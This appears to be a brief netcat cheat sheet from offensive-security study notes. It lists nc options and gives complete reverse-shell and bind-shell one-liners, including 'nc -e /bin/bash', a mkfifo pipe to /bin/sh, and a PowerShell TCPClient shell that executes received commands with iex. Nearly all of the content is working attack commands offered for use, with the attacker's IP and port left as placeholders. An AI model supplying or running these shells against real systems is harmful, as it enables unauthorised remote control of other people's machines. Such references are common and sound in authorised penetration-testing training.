**Operators** 

-l Listen mode 
-p Specify the Port number (use common ports)
-n Numeric only; no resolution of hostnames via DNS 
-v Verbose output (optional, yet useful to discover any bugs) 
-vv Very Verbose (optional) 
-k Keep listening after client disconnects


**Reverse Shell:**

**As Server:**

```
nc -[options] {Port}
```


**As Client (Target):**
```
nc {IP} {PORT} -e [/bin/bash OR "cmd.exe"]
```
OR
```
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
OR (Windows One Liner)
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```


**Bind Shell:**

**As Client (Target):**

```
nc -lvnp <port> -e "cmd.exe"
```  
	OR
```
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

**As Server:**

```
nc MACHINE_IP <port>
```